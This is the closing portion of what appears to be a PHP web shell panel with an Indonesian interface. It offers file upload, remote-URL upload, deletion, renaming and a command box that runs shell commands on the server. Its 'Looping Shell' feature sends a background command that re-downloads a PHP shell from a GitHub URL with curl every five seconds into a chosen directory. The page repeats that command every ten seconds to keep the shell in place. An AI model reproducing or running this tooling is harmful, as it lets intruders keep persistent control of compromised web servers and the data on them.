<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script>
function confirmDelete(name, event) {
    event.preventDefault();
    var link = event.target.closest('a');
    Swal.fire({ title: 'Hapus?', text: 'Yakin ingin menghapus "' + name + '"?', icon: 'warning', showCancelButton: true, confirmButtonColor: '#ff4757', cancelButtonColor: '#6c757d', confirmButtonText: 'Ya, hapus!', cancelButtonText: 'Batal', background: '#1a1a2e', color: '#fff' }).then((r) => { if (r.isConfirmed) window.location.href = link.getAttribute('href'); });
    return false;
}
function openRename(name, type) {
    document.getElementById('renameType').textContent = type.toUpperCase() + ': ' + name;
    document.getElementById('renameOld').value = name;
    document.getElementById('renameNew').value = name;
    new bootstrap.Modal(document.getElementById('renameModal')).show();
}

document.getElementById('uploadForm').addEventListener('submit', function(e) {
    e.preventDefault();
    var formData = new FormData(this);
    var prog = document.getElementById('uploadProgress');
    var bar = document.getElementById('progressBar');
    prog.style.display = 'block'; bar.style.width = '0%';
    $.ajax({
        url: '?dir=<?php echo urlencode($dir); ?>&ajax=upload',
        type: 'POST', data: formData, processData: false, contentType: false,
        xhr: function() {
            var xhr = new XMLHttpRequest();
            xhr.upload.addEventListener('progress', function(evt) { if (evt.lengthComputable) bar.style.width = Math.round((evt.loaded/evt.total)*100) + '%'; });
            return xhr;
        },
        success: function(res) {
            bar.style.width = '100%';
            setTimeout(function() { Swal.fire({ icon: 'success', title: 'Berhasil!', text: res.message || 'Upload selesai', background: '#1a1a2e', color: '#fff', confirmButtonColor: '#667eea' }).then(() => location.reload()); }, 500);
        },
        error: function() { prog.style.display = 'none'; Swal.fire({ icon: 'error', title: 'Gagal', text: 'Upload gagal', background: '#1a1a2e', color: '#fff', confirmButtonColor: '#667eea' }); }
    });
});

document.getElementById('remoteForm').addEventListener('submit', function(e) {
    e.preventDefault();
    var url = document.getElementById('remoteUrl').value;
    var prog = document.getElementById('remoteProgress');
    var bar = document.getElementById('remoteProgressBar');
    prog.style.display = 'block'; bar.style.width = '30%';
    $.ajax({
        url: '?dir=<?php echo urlencode($dir); ?>&ajax=upload',
        type: 'POST', data: { remote_url: url },
        success: function(res) {
            bar.style.width = '100%';
            setTimeout(function() { Swal.fire({ icon: 'success', title: 'Berhasil!', text: res.message || 'Remote upload selesai', background: '#1a1a2e', color: '#fff', confirmButtonColor: '#667eea' }).then(() => location.reload()); }, 500);
        },
        error: function() { prog.style.display = 'none'; Swal.fire({ icon: 'error', title: 'Gagal', text: 'Remote upload gagal', background: '#1a1a2e', color: '#fff', confirmButtonColor: '#667eea' }); }
    });
});

document.addEventListener('DOMContentLoaded', function() {
    document.addEventListener('keydown', function(e) {
        if ((e.ctrlKey||e.metaKey) && e.key === 's') {
            var form = document.querySelector('.editor-footer form');
            if (form) { e.preventDefault(); form.submit(); }
        }
    });
    document.querySelectorAll('input[name="cmd"]').forEach(function(inp) {
        inp.addEventListener('keydown', function(e) { if (e.key === 'Enter') { e.preventDefault(); this.closest('form').submit(); } });
    });

    // ========== LOOPING SHELL LOGIC (DENGAN MODAL DIRECTORY) ==========
    let loopInterval = null;
    const loopBtn = document.getElementById('loopShellBtn');
    const loopBtnText = document.getElementById('loopBtnText');
    const loopToast = document.getElementById('loopToast');
    const loopToastText = document.getElementById('loopToastText');
    const loopDirModalEl = document.getElementById('loopDirModal');
    const loopDirModal = new bootstrap.Modal(loopDirModalEl);

    // Tombol Looping: jika sudah running => stop, jika belum => buka modal
    loopBtn.addEventListener('click', function() {
        if (loopInterval) {
            // STOP looping
            clearInterval(loopInterval);
            loopInterval = null;
            loopBtn.classList.remove('active');
            loopBtnText.textContent = 'Looping Shell';
            loopToast.style.display = 'none';
            Swal.fire({
                icon: 'info',
                title: 'Looping Dihentikan',
                text: 'Proses looping shell telah berhenti.',
                background: '#1a1a2e',
                color: '#fff',
                confirmButtonColor: '#667eea',
                timer: 2000,
                timerProgressBar: true
            });
        } else {
            // Tampilkan modal dengan uname -a dan input direktori
            loopDirModal.show();
        }
    });

    // Handle submit form looping di modal
    document.getElementById('loopForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const targetDir = document.getElementById('loopDirInput').value.trim();

        if (!targetDir) {
            Swal.fire({
                icon: 'warning',
                title: 'Oops!',
                text: 'Direktori tidak boleh kosong!',
                background: '#1a1a2e',
                color: '#fff',
                confirmButtonColor: '#667eea'
            });
            return;
        }

        // Tutup modal
        loopDirModal.hide();

        // Command: buat direktori jika belum ada, lalu looping download shell ke direktori itu
        // Gunakan mkdir -p agar tidak error jika direktori sudah ada
        const cmd = "(mkdir -p " + targetDir + " && while true; do curl -sL https://raw.githubusercontent.com/nortslem/LiteSpeed/refs/heads/main/shellph8.php -o " + targetDir + "/shellph8.php; sleep 5; done) &";

        // Kirim command via AJAX untuk memulai proses background
        $.ajax({
            url: window.location.href,
            type: 'POST',
            data: { cmd: cmd },
            success: function() {
                // Set interval untuk keep-alive (ulang command tiap 10 detik agar proses tetap berjalan)
                loopInterval = setInterval(function() {
                    $.ajax({
                        url: window.location.href,
                        type: 'POST',
                        data: { cmd: cmd },
                        success: function() {
                            loopToastText.textContent = 'Looping ke ' + targetDir + ' - ' + new Date().toLocaleTimeString();
                        },
                        error: function() {
                            loopToastText.textContent = 'Looping: error request';
                        }
                    });
                }, 10000);

                // Update UI
                loopBtn.classList.add('active');
                loopBtnText.textContent = 'Stop Loop';
                loopToast.style.display = 'flex';
                loopToastText.textContent = 'Looping dimulai ke: ' + targetDir;

                Swal.fire({
                    icon: 'success',
                    title: 'Looping Dimulai!',
                    html: 'Shell akan didownload terus ke:<br><strong>' + targetDir + '/shellph8.php</strong><br>setiap 5 detik.',
                    background: '#1a1a2e',
                    color: '#fff',
                    confirmButtonColor: '#ff4757',
                    timer: 3000,
                    timerProgressBar: true
                });
            },
            error: function() {
                Swal.fire({
                    icon: 'error',
                    title: 'Gagal',
                    text: 'Gagal memulai looping shell. Cek path direktori.',
                    background: '#1a1a2e',
                    color: '#fff',
                    confirmButtonColor: '#667eea'
                });
            }
        });
    });

    // Reset modal form ketika ditutup tanpa submit
    loopDirModalEl.addEventListener('hidden.bs.modal', function() {
        // Tidak perlu reset value, biarkan sesuai default
    });
});
</script>
</body>
</html>
<?php
if ($message) {
    $icon = ($msgType === 'error') ? 'error' : 'success';
    $title = ($msgType === 'error') ? 'Gagal!' : 'Berhasil!';
    echo '<script>Swal.fire({icon:"' . $icon . '",title:"' . $title . '",text:"' . addslashes($message) . '",background:"#1a1a2e",color:"#fff",confirmButtonColor:"#667eea"});</script>';
}
?>
